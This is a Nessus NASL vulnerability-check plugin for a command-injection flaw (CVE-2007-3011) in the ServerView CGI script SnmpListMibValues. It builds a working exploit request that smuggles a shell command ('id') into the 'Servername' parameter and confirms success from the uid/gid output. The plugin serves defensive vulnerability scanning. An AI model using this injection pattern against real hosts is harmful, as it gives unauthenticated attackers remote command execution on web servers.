#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25672);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2007-3011");
  script_bugtraq_id(24762);
  script_xref(name:"OSVDB", value:"37835");

  script_name(english:"ServerView Servername Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command via ServerView's SnmpListMibValues script");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running ServerView, a web-based suite of asset
management tools. 

The version of ServerView installed on the remote host fails to
sanitize user-supplied input to the 'Servername' parameter of the
'SnmpView/SnmpListMibValues' script before using it to execute a shell
command.  An unauthenticated attacker can leverage this issue to
execute arbitrary code on the remote host subject to the privileges of
the web server user id. 

Note that the same result can be achieved via input to the
'ServerName' subparameter of the 'Parameterlist' parameter of the
'DBAsciiAccess' script." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/472800/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ServerView version 4.50.09 as that reportedly fixes the
issue." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

# Try to exploit the issue to run a command.
cmd = "id";
exploit = string(
  "SSL=&",
  "Server=", get_host_ip(), "&",
  "ThisApplication=TestConnectivityFirst&",
  "ServerName=bcmes&",
  "Servername=127.0.0.1;", cmd, ";,SType--Server&",
  "ParameterList=What--primary,,OtherCommunity--{{OtherCommunity}},,SecondIP--,,Timeout--5,,Community--public,,SType--,,ASPresent--1"
);

http_check_remote_code(
  check_request : string("/ServerView/SnmpView/SnmpListMibValues?", exploit),
  check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
  command       : cmd,
  port          : port
);

